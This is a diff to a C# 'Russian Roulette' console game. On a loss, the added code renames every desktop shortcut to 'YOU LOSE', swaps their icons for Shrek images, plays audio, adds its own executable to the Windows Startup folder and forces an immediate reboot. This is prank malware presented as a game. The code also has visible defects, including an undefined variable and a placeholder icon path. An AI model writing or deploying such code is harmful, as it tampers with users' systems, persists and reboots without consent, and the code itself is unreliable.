@@ -4,10 +4,16 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
-using System.IO;
 using System.Drawing;
 using System.Drawing.Imaging;
 using Russian_Roulette;
+using IWshRuntimeLibrary;
+using System.Text.Json;
+using File = System.IO.File;
+using Microsoft.Win32;
+
+
+
 
 namespace RussianRoulette
 {
@@ -93,6 +99,16 @@ namespace RussianRoulette
             style &= ~(WS_CAPTION | WS_SYSMENU);
             SetWindowLong(handle, GWL_STYLE, style);
             SetWindowPos(handle, IntPtr.Zero, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_FRAMECHANGED);
+
+            new Thread(() =>
+            {
+                Thread.Sleep(10000);
+                using (var ms = new MemoryStream(Resources.allstar))
+                using (var player = new System.Media.SoundPlayer(ms))
+                {
+                    player.Play();
+                }
+            }).Start();
 
             Console.OutputEncoding = Encoding.UTF8;
 
@@ -200,14 +216,59 @@ namespace RussianRoulette
             Console.WriteLine("Ты выиграл...");
         }
 
+
+        string GetIconPathForShortcut(string shortcutPath)
+        {
+            var shell = new WshShell();
+            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
+            return shortcut.IconLocation.Split(',')[0]; 
+        }
+
         static void Died()
         {
+            string backupDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Backup");
+            string backupIcons = Path.Combine(backupDir, "shortcuts");
+            Directory.CreateDirectory(backupDir);
+            Directory.CreateDirectory(backupIcons);
+
+
+            
+
+            string currentWallpaper = wallpaper as string ?? string.Empty;
+
+
+            if (currentWallpaper == null)
+            {
+                Console.WriteLine("⚠️ Не удалось найти текущие обои.");
+            }
+
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string[] shortcuts = Directory.GetFiles(desktopPath, "*.lnk");
+
+            List<ShortcutMetadata> metadata = new List<ShortcutMetadata>();
+            for (int i = 0; i < shortcuts.Length; i++)
+            {
+                string origLnk = shortcuts[i];
+                string fileName = $"shortcut{i}.lnk";
+                string iconPath = "путь к иконке"; // Здесь должно быть реальное значение для иконки
+
+                File.Copy(origLnk, Path.Combine(backupIcons, fileName), true);
+                metadata.Add(new ShortcutMetadata
+                {
+                    OriginalName = Path.GetFileName(origLnk),
+                    FileName = fileName,
+                    IconPath = iconPath
+                });
+            }
+
+            File.WriteAllText(Path.Combine(backupDir, "shortcut_metadata.json"),
+                JsonSerializer.Serialize(metadata));
+
             Console.Clear();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("УПС... Ты проиграл :)");
             Thread.Sleep(100);
 
-            // Эффект мигания
             ConsoleColor[] colors = (ConsoleColor[])Enum.GetValues(typeof(ConsoleColor));
             Random rnd = new Random();
 
@@ -237,28 +298,43 @@ namespace RussianRoulette
             SetWallpaper(bmpImagePath);
 
 
-            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            string[] shortcuts = Directory.GetFiles(desktopPath, "*.lnk");
-            int count = 1;
+            string iconFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Icons");
+            Directory.CreateDirectory(iconFolder);
 
-            foreach (string shortcut in shortcuts)
+            byte[][] iconResources = new byte[][]
             {
-                try
+                Resources.artShrek, Resources.Baybe, Resources.cat, Resources.Cat1, Resources.Cat2, Resources.Dragon, Resources.fairy,
+                Resources.Fiona, Resources.headShrek, Resources.Osel, Resources.OsloShrek, Resources.Pechen, Resources.princeCrarli,
+                Resources.shrek3, Resources.ShrekArtik, Resources.smallKing,
+            };
+
+            for (int i = 0; i < shortcuts.Length && i < iconResources.Length; i++)
+            {
+                string shortcutPath1 = shortcuts[i];
+                string newName = $"YOU LOSE ({i + 1}).lnk";
+                string newPath = Path.Combine(desktopPath, newName);
+
+                string iconPath = Path.Combine(iconFolder, $"icon{i}.ico");
+                using (var ms = new MemoryStream(iconResources[i]))
+                using (var icon = new Icon(ms))
+                using (var fs = new FileStream(iconPath, FileMode.Create))
                 {
-                    string newName = $"YOU LOSE ({count}).lnk";
-                    string newPath = Path.Combine(desktopPath, newName);
-                    File.Move(shortcut, newPath);
-                    count++;
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"Ошибка: {ex.Message}");
+                    icon.Save(fs);
                 }
 
+                var shell1 = new WshShell();
+                var lnk = (IWshShortcut)shell1.CreateShortcut(shortcutPath1);
+                lnk.IconLocation = iconPath;
+                lnk.Save();
+
+                using (var ms = new MemoryStream(Resources.allstar))
+                using (var player = new System.Media.SoundPlayer(ms))
+                {
+                    player.Play();
+                }
+
+                System.IO.File.Move(shortcutPath1, newPath);
             }
-
-
-
 
             string exePath = Process.GetCurrentProcess().MainModule.FileName;
             for (int i = 0; i < 10; i++)
@@ -267,7 +343,16 @@ namespace RussianRoulette
 
             }
 
-            
+            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            string shortcutPath2 = Path.Combine(startupFolder, "MyAppShortcut.lnk");
+
+            var shell2 = new WshShell();
+            var shortcut = (IWshShortcut)shell2.CreateShortcut(shortcutPath2);
+            shortcut.TargetPath = exePath;
+            shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
+            shortcut.Save();
+
+
             Process.Start(new ProcessStartInfo("shutdown", "/r /t 0")
             {
                 CreateNoWindow = true,
@@ -280,6 +365,12 @@ namespace RussianRoulette
 
 
 
+    }
+    class ShortcutMetadata
+    {
+        public string OriginalName { get; set; }
+        public string FileName { get; set; }
+        public string IconPath { get; set; }
     }
 
     class DesktopIcons
